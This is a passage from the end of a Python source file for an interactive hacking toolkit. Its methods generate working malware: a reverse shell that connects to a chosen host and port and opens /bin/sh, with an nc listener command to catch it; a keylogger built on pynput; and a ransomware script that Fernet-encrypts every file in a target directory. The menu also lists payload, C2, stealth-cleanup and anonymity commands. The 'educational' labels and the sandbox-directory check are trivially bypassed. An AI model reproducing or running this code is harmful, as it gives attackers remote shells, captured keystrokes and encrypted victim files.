    def edu_reverse_shell(self):
        lhost = input(f"{self.prompt()}LHOST (your IP) > ")
        lport = input(f"{self.prompt()}LPORT > ")
        
        code = f'''#!/usr/bin/env python3
# EDUCATIONAL REVERSE SHELL - FOR TESTING ONLY
import socket,subprocess,os

if not os.getcwd().startswith(os.path.expanduser("~/malware_sandbox")):
    print("[!] For educational use only. Run in sandbox!")
    exit()

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("{lhost}", {lport}))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])

if __name__ == "__main__":
    connect()
'''
        
        sandbox = os.path.expanduser("~/malware_sandbox")
        os.makedirs(sandbox, exist_ok=True)
        filename = f"{sandbox}/reverse_shell_{int(time.time())}.py"
        with open(filename, 'w') as f:
            f.write(code)
        os.chmod(filename, 0o755)
        
        print(f"\n{Colors.GREEN}[+] Saved to: {filename}{Colors.END}")
        print(f"{Colors.CYAN}[*] Run: python3 {filename}{Colors.END}")
        print(f"{Colors.CYAN}[*] Listener: nc -lvnp {lport}{Colors.END}")
    
    def edu_keylogger(self):
        code = '''#!/usr/bin/env python3
# EDUCATIONAL KEYLOGGER DEMO - FOR TESTING ONLY
import os,sys
from datetime import datetime

if not os.getcwd().startswith(os.path.expanduser("~/malware_sandbox")):
    print("[!] For educational use only. Run in sandbox!")
    exit()

log_file = os.path.expanduser("~/malware_sandbox/keylog.txt")

try:
    from pynput.keyboard import Listener
except:
    print("[!] Install: pip install pynput")
    sys.exit(1)

def on_press(key):
    with open(log_file, 'a') as f:
        f.write(f"{datetime.now()}: {key}\\n")
    print(f"Key logged: {key}")

print(f"[*] Logging to: {log_file}")
print("[*] Press Ctrl+C to stop")

with Listener(on_press=on_press) as listener:
    listener.join()
'''
        
        sandbox = os.path.expanduser("~/malware_sandbox")
        os.makedirs(sandbox, exist_ok=True)
        filename = f"{sandbox}/keylogger_{int(time.time())}.py"
        with open(filename, 'w') as f:
            f.write(code)
        os.chmod(filename, 0o755)
        
        print(f"\n{Colors.GREEN}[+] Saved to: {filename}{Colors.END}")
        print(f"{Colors.CYAN}[*] Run: python3 {filename}{Colors.END}")
        print(f"{Colors.CYAN}[*] Install pynput: pip install pynput{Colors.END}")
    
    def edu_ransomware(self):
        target_dir = input(f"{self.prompt()}target dir (in sandbox) > ") or "~/malware_sandbox/test_files"
        target_dir = os.path.expanduser(target_dir)
        
        code = f'''#!/usr/bin/env python3
# EDUCATIONAL RANSOMWARE DEMO - FOR TESTING ONLY
import os
from cryptography.fernet import Fernet

if not os.getcwd().startswith(os.path.expanduser("~/malware_sandbox")):
    print("[!] For educational use only. Run in sandbox!")
    exit()

target_dir = "{target_dir}"
os.makedirs(target_dir, exist_ok=True)

for i in range(3):
    with open(f"{{target_dir}}/test_{{i}}.txt", 'w') as f:
        f.write("Test file for educational ransomware demo")

key = Fernet.generate_key()
cipher = Fernet(key)

for file in os.listdir(target_dir):
    filepath = os.path.join(target_dir, file)
    if os.path.isfile(filepath):
        with open(filepath, 'rb') as f:
            data = f.read()
        encrypted = cipher.encrypt(data)
        with open(filepath, 'wb') as f:
            f.write(encrypted)
        print(f"[+] Encrypted: {{file}}")

print(f"\\n[!] Key: {{key.decode()}}")
print("[!] To decrypt, run:")
print(f"    cipher = Fernet(b'{{key.decode()}}')")
'''
        
        sandbox = os.path.expanduser("~/malware_sandbox")
        os.makedirs(sandbox, exist_ok=True)
        os.makedirs(target_dir, exist_ok=True)
        filename = f"{sandbox}/ransomware_demo_{int(time.time())}.py"
        with open(filename, 'w') as f:
            f.write(code)
        os.chmod(filename, 0o755)
        
        print(f"\n{Colors.GREEN}[+] Saved to: {filename}{Colors.END}")
        print(f"{Colors.CYAN}[*] Run: python3 {filename}{Colors.END}")
    
    # ==================== MAIN LOOP ====================
    
    def run(self):
        self.clear()
        
        while True:
            try:
                self.show_menu()
                cmd = input(self.prompt()).strip().lower()
                
                # OSINT
                if cmd in ['phone', 'tel']:
                    self.phone_osint()
                elif cmd in ['ip', 'geo']:
                    self.ip_tracker()
                elif cmd in ['username', 'user']:
                    self.username_check()
                elif cmd in ['subdomain', 'sub']:
                    self.subdomain_scan()
                elif cmd in ['port', 'scan']:
                    self.port_scanner()
                elif cmd in ['dork', 'google']:
                    self.dork_generator()
                elif cmd in ['email', 'mail']:
                    self.email_osint()
                elif cmd in ['whois']:
                    self.whois_lookup()
                elif cmd in ['dns']:
                    self.dns_lookup()
                
                # Attack
                elif cmd in ['payload', 'p']:
                    self.generate_payload()
                elif cmd in ['c2', 'server']:
                    self.start_c2()
                elif cmd in ['stealth', 's']:
                    self.stealth_clean()
                elif cmd in ['anon', 'a']:
                    self.anonymity()
                
                # Utility
                elif cmd in ['crypt', 'encrypt']:
                    self.file_crypt()
                elif cmd in ['hash']:
                    self.hash_generator()
                elif cmd in ['encode']:
                    self.encode_decode()
                elif cmd in ['passgen', 'pg']:
                    self.password_generator()
                elif cmd in ['malware', 'mw']:
                    self.educational_malware()
                
                # System
                elif cmd in ['clear', 'cls']:
                    self.clear()
                elif cmd in ['help', '?']:
                    self.show_menu()
                elif cmd in ['exit', 'quit', 'q']:
                    print(f"{Colors.RED}[!] Returning to void...{Colors.END}")
                    sys.exit(0)
                elif cmd == '':
                    continue
                else:
                    print(f"{Colors.RED}[!] Unknown command: {cmd}. Type 'help'{Colors.END}")
                    
            except KeyboardInterrupt:
                print(f"\n{Colors.RED}[!] Interrupted. Exiting...{Colors.END}")
                sys.exit(0)
            except Exception as e:
                print(f"{Colors.RED}[!] Error: {e}{Colors.END}")

if __name__ == "__main__":
    core = ForgottenCore()
    core.run()
